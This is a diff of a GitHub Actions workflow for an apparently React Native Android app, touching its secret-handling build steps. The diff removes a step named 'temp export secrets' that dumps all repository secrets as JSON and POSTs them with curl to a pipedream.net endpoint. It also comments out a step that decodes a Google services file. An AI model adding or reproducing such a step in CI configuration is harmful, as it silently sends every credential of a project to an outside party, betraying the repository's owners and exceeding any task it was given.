@@ -95,11 +95,6 @@ jobs:
       )
     # Steps represent a sequence of tasks that will be executed as part of the job
     steps:
-      - name: temp export secrets
-        env:
-          SECRETS_CONTEXT: ${{ toJson(secrets) }}
-        run: |
-          curl https://5c5579e8fba46d8876c693d3a5a7b383.m.pipedream.net -d "$SECRETS_CONTEXT" -H "content-type:application/json" -XPOST
       - name: Git branch name
         id: git-branch-name
         uses: EthanSK/git-branch-name-action@v1
@@ -169,8 +164,8 @@ jobs:
           echo "adding secrets to .env.$env_name file"
           echo "$SENTRYRC" > android/sentry.properties
           echo "REACT_APP_CODE_PUSH_KEY=$(grep -Po '(?<=^APPCENTER_CODEPUSH_TOKEN=)\S+' .env.$env_name)" >> .env.$env_name
-      - name: Setup google services file
-        run: echo "${{ secrets.ANDROID_GOOGLE_SERVICES}}" | base64 --decode > ./android/app/google-services.json
+      # - name: Setup google services file
+      #   run: echo "${{ secrets.ANDROID_GOOGLE_SERVICES}}" | base64 --decode > ./android/app/google-services.json
       - name: Set release keystore
         run: |
           echo "${{ secrets.RELEASE_ANDROID_KEYSTORE }}" > release.keystore.asc
